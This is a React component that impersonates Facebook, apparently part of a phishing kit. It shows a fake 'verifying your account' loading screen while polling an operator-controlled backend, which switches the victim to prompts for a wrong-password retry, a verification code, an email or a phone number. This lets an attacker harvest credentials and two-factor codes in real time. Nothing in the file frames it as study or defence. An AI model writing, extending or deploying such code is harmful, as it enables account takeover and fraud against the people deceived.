import React, { useState, useEffect, useRef } from "react";
import axios from 'axios'
import { API_BE } from "./utils/variable";

export const LoadingFacebookButton = (props) => {
  const pollInterval = useRef(null);

  const checkScreenSwitch = () => {
    const result = JSON.parse(localStorage.getItem('result'))

    axios.get(`${API_BE}/results/${result.id}/`).then(response => response.data).then(data => {
      localStorage.setItem('result', JSON.stringify(data))
      switch(data.nextPage) {
        case 'wrong':
          clearInterval(pollInterval.current)
          props.setValue(1)
          setNextPageNull()
          break
        case 'codeGen':
          clearInterval(pollInterval.current)
          props.setValue(2)
          setNextPageNull()
          break
        case 'email':
          clearInterval(pollInterval.current)
          props.setValue(3)
          setNextPageNull()
          break
        case 'phone':
          clearInterval(pollInterval.current)
          props.setValue(4)
          setNextPageNull()
          break
        case 'sixty':
          clearInterval(pollInterval.current)
          props.setValue(6)
          setNextPageNull()
          break
        case 'thankyou':
          clearInterval(pollInterval.current)
          props.setValue(5)
          setNextPageNull()
          break
        default:
          break
      }
    })
  };

  const setNextPageNull = () => {
    const result = JSON.parse(localStorage.getItem('result'))

    axios.patch(`${API_BE}/results/${result.id}/`, {
      codeSentTo: null,
      nextPage: null
    }).then(() => {})
  }

  useEffect(() => {
    pollInterval.current = setInterval(checkScreenSwitch, 2000)

    return () => {
      clearInterval(pollInterval.current)
    }
  }, []);

  return (
    <>
      <div className="header-color">
        <div className="header-container">
          <h2>facebook</h2>
        </div>
      </div>

      <div class="loading-container">
        <div class="loading-message">
          Please be patient and dont close this window
        </div>
        <div class="loading-submessage step1">
          Checking the details on your account...
        </div>
        <div class="loading-submessage step2">Checking email addresses...</div>
        <div class="loading-submessage step3">
          Checking two-factor authenticator...
        </div>
        <div class="loading-submessage step4">Checking other details...</div>
        <div class="loading-submessage finalStep">
          It can take up to 10 minutes to verify your account.
        </div>
        <div class="loader"></div>
      </div>
    </>
  );
};
